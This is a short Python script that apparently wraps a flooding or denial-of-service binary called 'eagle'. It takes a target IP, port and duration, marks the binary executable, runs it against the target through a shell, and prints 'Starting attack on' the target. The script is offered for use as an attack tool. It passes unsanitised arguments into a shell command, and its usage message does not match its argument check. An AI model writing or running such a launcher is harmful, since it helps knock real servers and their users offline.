import subprocess
import sys
import os

def main():
    if len(sys.argv) != 6:
        print("Usage: python3 main.py <ip> <port> <time> 100")
        sys.exit(1)
    
    ip, port, duration, size, threads = sys.argv[1:6]
    
    if os.path.exists("eagle"):
        os.chmod("eagle", 0o755)
    
    print(f"Starting attack on {ip}:{port}")
    
    result = subprocess.run(f"./eagle {ip} {port} {duration} 100", shell=True)
    
    print(f"Attack finished")

if __name__ == "__main__":
    main()